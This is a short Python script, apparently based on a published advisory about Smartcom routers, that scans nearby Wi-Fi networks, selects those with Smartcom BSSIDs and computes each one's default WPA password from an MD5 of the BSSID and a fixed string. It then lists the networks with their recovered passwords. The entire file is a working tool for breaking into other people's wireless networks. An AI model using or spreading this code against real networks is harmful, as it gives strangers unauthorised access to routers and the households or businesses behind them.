"""https://sec.stanev.org/advisories/Smartcom_default_WPA_password.txt"""

from hashlib import md5
from io import BytesIO
from subprocess import check_output
from sys import stderr

from pandas import read_fwf
from rich import print

BSSID_LEN = 12
SERIAL_OFFSET = 4
PASSWORD_LEN = 8
SMARTCOM_PREFIX = "50a9de"


def normalize_bssid(bssid: str) -> str:
    bssid = bssid.lower().replace(":", "")

    if len(bssid) != BSSID_LEN:
        raise ValueError("Invalid BSSID size.")

    return bssid


def md5sum(data: bytes | str) -> str:
    if isinstance(data, str):
        data = data.encode("ascii")

    return md5(data).hexdigest()


def smartcom_password(bssid: str) -> str:
    bssid = normalize_bssid(bssid)

    if not bssid.startswith(SMARTCOM_PREFIX):
        raise NotImplementedError("Only Smartcom BSSIDs are supported.")

    preimage = f"{bssid[SERIAL_OFFSET:]}SmartcomWifi"
    preimage_md5 = md5sum(preimage)

    return preimage_md5[:PASSWORD_LEN]


wifi_list = check_output("nmcli device wifi list", shell=True)
wifi_df = read_fwf(BytesIO(wifi_list))
wifi_df["BSSID"] = wifi_df["BSSID"].apply(normalize_bssid)

if not (potential := len(wifi_df)):
    print("[red]No Wi-Fi networks found. Check if Wi-Fi is enabled.", file=stderr)
    exit(1)

smartcom_df = wifi_df[wifi_df["BSSID"].str.startswith(SMARTCOM_PREFIX)]

if not (targets := len(smartcom_df)):
    print(f"Found {potential} potential Wi-Fi networks.")
    print("[red]No Smartcom networks found.", file=stderr)
    exit(1)

print(f"[green]{targets} Smartcom network(s) out of {len(wifi_df)} Wi-Fi network(s).")

for row in smartcom_df.to_dict(orient="records", into=dict[str, str]()):
    password = smartcom_password(row["BSSID"])
    print(f"{row['SSID']}: {password} ({row['BARS']})")
